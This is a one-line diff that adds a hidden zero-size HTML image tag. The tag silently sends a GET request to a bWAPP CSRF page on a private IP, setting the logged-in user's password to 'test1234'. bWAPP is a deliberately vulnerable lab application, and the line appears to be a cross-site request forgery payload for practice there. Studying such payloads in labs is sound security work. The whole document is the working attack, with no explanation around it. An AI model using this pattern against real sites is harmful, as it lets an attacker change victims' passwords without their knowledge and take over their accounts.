@@ -1,0 +1,1 @@
+<img src="http://192.168.20.205/bWAPP/csrf_1.php?password_new=test1234&password_conf=test1234&action=change" height=0 width=0>
